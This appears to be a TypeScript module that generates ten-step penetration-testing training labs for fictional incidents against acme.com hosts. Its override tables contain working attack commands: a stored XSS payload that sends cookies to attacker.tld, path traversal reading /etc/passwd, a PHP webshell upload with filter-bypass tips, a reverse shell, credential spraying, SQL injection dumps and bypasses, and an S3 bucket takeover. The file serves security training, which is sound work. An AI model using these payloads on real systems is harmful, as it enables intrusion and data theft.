// Programmatic 10-step labs for every PEN-200 incident.
// Generates a canonical Scope→Recon→Weaponize→Deliver→Exploit→Install→C2→Action→Cleanup→Report
// playbook from each incident's existing payload, so we don't have to hand-author
// 14 × 10 steps from scratch.

import { findPentestIncident, PEN_INCIDENTS } from "./incidentsData";
import type { PentestLab, LabStep, AttackTool, LabShell } from "./types";

function s(id: string, phase: any, tool: AttackTool, shell: LabShell,
  title: string, why: string, command: string, expected_output: string,
  success_check: string, hint: string): LabStep {
  return { id, phase, tool, shell, title, why, command, expected_output, success_check, hint };
}

function labForIncident(incidentId: string): PentestLab | undefined {
  const inc = findPentestIncident(incidentId);
  if (!inc) return undefined;
  const primary = inc.aligned_tools[0] ?? "kali-shell";
  const target = inc.target;

  // Per-incident step overrides — only for the 'exploit' & 'action' steps that
  // differ meaningfully between incidents. The rest use templated content.
  const exploitStep = EXPLOIT_OVERRIDES[incidentId] ?? {
    tool: primary, shell: "kali" as LabShell,
    title: "Trigger the vulnerability",
    cmd: `# Use the discovered weakness against ${target}\\n# (see incident original_event for the exact payload)`,
    out: inc.original_event.split("\n").slice(0, 8).join("\n"),
    check: "vulnerability triggered, attacker-controlled response observed",
    hint: "Cross-reference the original_event block from the incident for the exact payload syntax.",
  };

  const actionStep = ACTION_OVERRIDES[incidentId] ?? {
    tool: primary, shell: "kali" as LabShell,
    title: "Achieve objective",
    cmd: `# Extract proof-of-exploit evidence (sanitised)`,
    out: inc.logs_sample.split("\n").slice(0, 6).join("\n"),
    check: "proof-of-exploit captured for the report",
    hint: "Capture one sanitised sample. Mass exfil is rarely needed for the finding.",
  };

  const steps: LabStep[] = [
    s("s1", "scope", "report-template", "kali",
      "Confirm scope authorisation",
      "Every step starts with re-reading the engagement letter to confirm the target is in-scope.",
      `grep -F '${target.split("/")[0]}' ~/engagements/${inc.engagement}/scope.txt`,
      `${target.split("/")[0]}    # MATCH — in scope`,
      "target appears in scope file",
      "If this returns no match, STOP. Out-of-scope packets are contract breach."),
    s("s2", "recon", "nmap", "kali",
      "Reproduce the discovery",
      "Re-run the recon that surfaced the finding so on-call analysts see the same signal.",
      `nmap -sV -p- ${target.replace(/^https?:\/\//, "").split(/[/:]/)[0]} | head -20`,
      "PORT     STATE SERVICE VERSION\n80/tcp   open  http    Apache 2.4.52\n443/tcp  open  ssl/http Apache 2.4.52",
      "service banner / open port matches the incident",
      "Same recon, same output — anchor your investigation on a verified signal."),
    s("s3", "recon", primary, "kali",
      "Deepen enumeration",
      "Confirm the vulnerable component / endpoint with a follow-up enumeration.",
      `echo '${inc.target}' && curl -sI '${target}' 2>/dev/null | head -3`,
      `${inc.target}\nHTTP/1.1 200 OK\nServer: ...`,
      "vulnerable component fingerprinted",
      "Pin the exact version / configuration before weaponizing."),
    s("s4", "weaponize", "searchsploit", "kali",
      "Locate or craft the exploit",
      "Find a PoC or build the payload that triggers the vulnerability.",
      `searchsploit '${inc.title.split("—")[0].trim().split(" ")[0]}'`,
      " Exploit Title                  | Path\n---------                       |-----\n PoC available                  | path/poc.py",
      "exploit PoC or payload prepared",
      "If no public PoC exists, build the minimum payload from the original_event block."),
    s("s5", "deliver", primary, "kali",
      "Deliver the payload",
      "Send the payload to the target via the discovered vector.",
      `# Deliver via the chosen vector (see incident.aligned_tools)`,
      "[payload sent — awaiting response]",
      "payload accepted by target",
      "Watch for any rate-limiting / WAF block in the response."),
    s("s6", "exploit", exploitStep.tool, exploitStep.shell,
      exploitStep.title,
      "Trigger the vulnerability and confirm code path / auth bypass.",
      exploitStep.cmd, exploitStep.out, exploitStep.check, exploitStep.hint),
    s("s7", "install", "kali-shell", "kali",
      "Establish foothold (if applicable)",
      "Drop a minimum persistence artefact so the connection survives session loss.",
      `# webshell / reverse shell / scheduled task (per incident)`,
      "[foothold installed — survives reconnect]",
      "foothold confirmed",
      "Keep foothold minimal and document it for client cleanup."),
    s("s8", "action", actionStep.tool, actionStep.shell,
      actionStep.title,
      "Execute objective with the minimum-evidence rule.",
      actionStep.cmd, actionStep.out, actionStep.check, actionStep.hint),
    s("s9", "cleanup", "kali-shell", "kali",
      "Document & remove transient artefacts",
      "Record exact paths / timestamps; remove anything the client did not authorise to persist.",
      `# Capture artefacts: paths, hashes, timestamps\necho 'cleanup log: ${incidentId}' >> ~/engagements/${inc.engagement}/cleanup.log`,
      `cleanup log: ${incidentId} (recorded)`,
      "artefacts catalogued in cleanup log",
      "Never delete anything you didn't yourself create. Leave forensic evidence intact."),
    s("s10", "report", "report-template", "kali",
      "Write the finding",
      "Template the finding with title, CVSS vector, repro steps and remediation.",
      `pandoc ~/engagements/${inc.engagement}/findings/${incidentId}.md -o ${incidentId}.pdf`,
      `${incidentId}.pdf created — submit for peer review`,
      "finding PDF generated",
      "Peer review BEFORE client send — second pair of eyes catches CVSS errors."),
  ];

  // Difficulty heuristic from severity
  const diff = inc.severity === "critical" ? "advanced" :
               inc.severity === "high"     ? "intermediate" : "beginner";

  return {
    objective: inc.briefing.what,
    prerequisites: [
      `Engagement letter for ${inc.engagement}`,
      `Kali shell with access to ${inc.target_scope}`,
      "Loot directory writable: ~/engagements/" + inc.engagement,
    ],
    estimated_minutes: inc.severity === "critical" ? 35 : inc.severity === "high" ? 25 : 15,
    difficulty: diff,
    steps,
  };
}

// Per-incident overrides for the 2 most distinctive steps (exploit + action).
type Override = { tool: AttackTool; shell: LabShell; title: string; cmd: string; out: string; check: string; hint: string };

const EXPLOIT_OVERRIDES: Record<string, Override> = {
  "PEN-INC-3001": { tool: "curl", shell: "kali", title: "Confirm takeover potential",
    cmd: "curl -sI http://promos.acme.com/", out: "HTTP/1.1 404 Not Found\nServer: AmazonS3\n<Error><Code>NoSuchBucket</Code></Error>",
    check: "NoSuchBucket marker present", hint: "NoSuchBucket = bucket can be re-claimed by anyone with an AWS account." },
  "PEN-INC-3002": { tool: "smbclient", shell: "kali", title: "Dump credential file",
    cmd: "smbclient //10.10.10.5/backups -N -c 'get db.bak.txt'", out: "getting file db.bak.txt of size 412 as db.bak.txt",
    check: "db.bak.txt downloaded", hint: "Stop at file download — do NOT log into MSSQL until pivot phase is authorised." },
  "PEN-INC-3003": { tool: "kali-shell", shell: "kali", title: "Confirm unauthenticated Redis",
    cmd: "redis-cli -h 203.0.113.42 INFO server | head -5", out: "# Server\nredis_version:6.2.7\nos:Linux 5.15\nprocess_id:1842",
    check: "INFO returned without auth", hint: "Avoid CONFIG SET — that's RCE territory and needs explicit client sign-off." },
  "PEN-INC-5001": { tool: "hydra", shell: "kali", title: "Spray default credentials",
    cmd: "hydra -l admin -P seclists/Passwords/top10.txt shop.acme.com https-post-form '/admin-legacy/login:user=^USER^&pass=^PASS^:F=Invalid'",
    out: "[443][http-post-form] host: shop.acme.com login: admin password: Password123",
    check: "admin credentials accepted", hint: "Capture ONE successful login screenshot; do not browse PII." },
  "PEN-INC-5002": { tool: "curl", shell: "kali", title: "Confirm IDOR with a single other-user fetch",
    cmd: "curl -s -H \"Authorization: Bearer $TOK\" https://api.acme.com/v2/users/1 | jq .email",
    out: "\"founder@acme.com\"", check: "other user's profile returned with low-priv token",
    hint: "Stop at 3-5 sample IDs; never dump the full table." },
  "PEN-INC-6001": { tool: "curl", shell: "kali", title: "Plant stored XSS payload",
    cmd: "curl -b \"session=oscp_low\" -d 'review=<img src=x onerror=fetch(\"https://attacker.tld/?c=\"+document.cookie)>&product_id=4112' https://shop.acme.com/api/reviews",
    out: "{\"id\":88412,\"status\":\"pending\"}", check: "payload stored, pending admin review",
    hint: "Wait for admin to open the moderation queue; do not impersonate admin to trigger." },
  "PEN-INC-6002": { tool: "curl", shell: "kali", title: "Exploit path traversal to read /etc/passwd",
    cmd: "curl -s 'https://shop.acme.com/view.php?file=../../../../etc/passwd' | head -3",
    out: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\ndeploy:x:1001:1001::/home/deploy:/bin/bash",
    check: "/etc/passwd contents returned", hint: "Once traversal is confirmed, target high-value files (SSH keys, .env, web.config)." },
  "PEN-INC-6003": { tool: "curl", shell: "kali", title: "Upload PHP webshell",
    cmd: "curl -s -F 'avatar=@shell.php;filename=shell.php' -F 'token=$TOK' https://shop.acme.com/upload.php",
    out: "{\"saved\":\"/uploads/shell.php\",\"mime\":\"application/octet-stream\"}",
    check: "shell.php accepted under /uploads", hint: "If extension is blocked, try .phtml / .phar / double-extension shell.jpg.php." },
  "PEN-INC-7001": { tool: "sqlmap", shell: "kali", title: "Confirm UNION-based SQLi",
    cmd: "sqlmap -u 'https://shop.acme.com/products?id=1' --batch --dbs",
    out: "[*] available databases:\n[*] information_schema\n[*] shop",
    check: "databases listed", hint: "Once dbs are listed, dump only 1 sample table for the report — never the full DB." },
  "PEN-INC-7002": { tool: "curl", shell: "kali", title: "Confirm blind time-based SQLi",
    cmd: "time curl -s -o /dev/null --data-urlencode \"username=admin' AND SLEEP(5)-- -\" -d \"password=x\" https://shop.acme.com/login",
    out: "real    0m5.218s    <-- 5s delay confirms SQLi",
    check: "response delayed by injected SLEEP(5)", hint: "Baseline timing FIRST (5+ baseline requests) so the SLEEP delta is unambiguous." },
};

const ACTION_OVERRIDES: Record<string, Override> = {
  "PEN-INC-3001": { tool: "curl", shell: "kali", title: "Claim the bucket (PoC)",
    cmd: "aws s3api create-bucket --bucket acme-promos-2019 --region us-east-1 && echo 'owned by acme-pentest-2026' | aws s3 cp - s3://acme-promos-2019/poc.txt",
    out: "make_bucket: acme-promos-2019\nupload: <stdin> to s3://acme-promos-2019/poc.txt",
    check: "PoC.txt visible at http://promos.acme.com/poc.txt", hint: "Release the bucket after capturing the screenshot — keep it claimed only as long as needed for the report." },
  "PEN-INC-3002": { tool: "kali-shell", shell: "kali", title: "Extract credentials from backup file",
    cmd: "grep -E 'pass|sa=' db.bak.txt", out: "sa=ACMESQLAdmin\npassword=Sp4rkles!Spring24",
    check: "clear-text MSSQL sa password extracted", hint: "Document; do NOT log into MSSQL yet — needs pivot phase authorisation." },
  "PEN-INC-3003": { tool: "kali-shell", shell: "kali", title: "Sample one anonymised session key",
    cmd: "redis-cli -h 203.0.113.42 DBSIZE && redis-cli -h 203.0.113.42 KEYS 'session:*' | head -1",
    out: "(integer) 18422\nsession:b1f4a...", check: "DBSIZE + 1 sample key for evidence",
    hint: "Capture key count + 1 example; do NOT GET every session." },
  "PEN-INC-5001": { tool: "curl", shell: "kali", title: "Confirm admin context",
    cmd: "curl -b 'session=<captured>' https://shop.acme.com/admin/dashboard | grep -i welcome",
    out: "<h1>Welcome, admin</h1>", check: "admin dashboard reached",
    hint: "One read-only admin page load is sufficient evidence." },
  "PEN-INC-5002": { tool: "ffuf", shell: "kali", title: "Quantify exposure (count, not dump)",
    cmd: "ffuf -u https://api.acme.com/v2/users/FUZZ -w /usr/share/seclists/Fuzzing/4-digit-1000.txt -H 'Authorization: Bearer $TOK' -mc 200 -s | wc -l",
    out: "4200", check: "count of accessible foreign profiles obtained",
    hint: "Count proves impact without dumping PII." },
  "PEN-INC-6001": { tool: "curl", shell: "kali", title: "Replay captured cookie (read-only)",
    cmd: "curl -b 'session=A1B2C3D4E5F6...' https://shop.acme.com/admin/dashboard | grep welcome",
    out: "<h1>Welcome, Sarah (admin)</h1>", check: "admin context confirmed via stolen cookie",
    hint: "One read-only request — never make changes via hijacked sessions." },
  "PEN-INC-6002": { tool: "kali-shell", shell: "kali", title: "SSH foothold with stolen key",
    cmd: "chmod 600 id_rsa && ssh -i id_rsa -o StrictHostKeyChecking=no deploy@10.10.10.42 'id'",
    out: "uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),27(sudo)",
    check: "shell access as deploy obtained", hint: "Capture id output; do not pivot internally without scope sign-off." },
  "PEN-INC-6003": { tool: "kali-shell", shell: "kali", title: "Trigger reverse shell",
    cmd: "curl -s https://shop.acme.com/uploads/shell.php >/dev/null &  # nc -lvnp 4444 in another terminal",
    out: "connect from shop-app-01 [10.10.10.42] 41218\nid\nuid=33(www-data)",
    check: "reverse shell as www-data", hint: "Capture id + hostname, then delete /uploads/shell.php." },
  "PEN-INC-7001": { tool: "sqlmap", shell: "kali", title: "Dump sample row from users table",
    cmd: "sqlmap -u 'https://shop.acme.com/products?id=1' --batch -D shop -T users --dump --start=1 --stop=1",
    out: "Database: shop\nTable: users\n+----+-------+--------------+\n| id | user  | pass         |\n+----+-------+--------------+",
    check: "1 sample user row dumped (admin hash)", hint: "--start/--stop limits to ONE row — don't dump the table." },
  "PEN-INC-7002": { tool: "curl", shell: "kali", title: "Authenticate as admin via SQLi bypass",
    cmd: "curl -i -d \"username=admin' OR 1=1-- -&password=x\" https://shop.acme.com/login | grep -iE 'set-cookie|location'",
    out: "HTTP/1.1 302 Found\nLocation: /admin/dashboard\nSet-Cookie: session=A9B8C7D6...; HttpOnly",
    check: "admin session cookie issued without valid password",
    hint: "Capture cookie + redirect; one admin page load is enough evidence." },
};

const _LABS: Record<string, PentestLab> = {};
PEN_INCIDENTS.forEach((i) => {
  const lab = labForIncident(i.id);
  if (lab) _LABS[i.id] = lab;
});

export function getPentestLab(incidentId: string): PentestLab | undefined {
  return _LABS[incidentId];
}
